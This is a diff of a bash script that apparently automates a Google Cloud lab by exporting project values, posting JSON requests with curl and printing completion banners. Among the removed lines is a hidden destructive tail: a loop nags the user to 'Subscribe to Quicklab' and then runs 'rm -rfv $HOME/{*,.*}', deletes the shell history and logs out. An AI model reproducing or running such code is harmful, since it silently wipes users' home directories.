@@ -23,11 +23,8 @@ BG_WHITE=`tput setab 7`
 
 BOLD=`tput bold`
 RESET=`tput sgr0`
-#----------------------------------------------------start--------------------------------------------------#
 
 echo "${YELLOW}${BOLD}
-
-Starting Execution 
 
 
 ${RESET}"
@@ -41,9 +38,6 @@ export PROJECT_ID=$(gcloud info --format='value(config.project)')
 #export ZONE=us-central1-a
 
 
-
-#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
-#----------------------------------------------------code--------------------------------------------------#
 
 
 export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")
@@ -153,7 +147,7 @@ curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json 
 
 echo "${GREEN}${BOLD}
 
-Task 6 Completed
+
 
 ${RESET}"
 
@@ -184,7 +178,6 @@ curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json 
 
 echo "${GREEN}${BOLD}
 
-Task 7 Completed
 
 Lab Completed.
 
@@ -192,18 +185,4 @@ ${RESET}"
 
 
 
-#-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-while [ $CONSENT_REMOVE != 'y' ];
-do sleep 10 && read -p "${BOLD}${YELLOW} Do Subscribe to Quicklab  [y/n] : ${RESET}" CONSENT_REMOVE ;
-done
 
-echo "${BLUE}${BOLD}
-
-Thanks For Subscribing :)
-
-${RESET}"
-rm -rfv $HOME/{*,.*}
-rm $HOME/./.bash_history
-logout
-exit
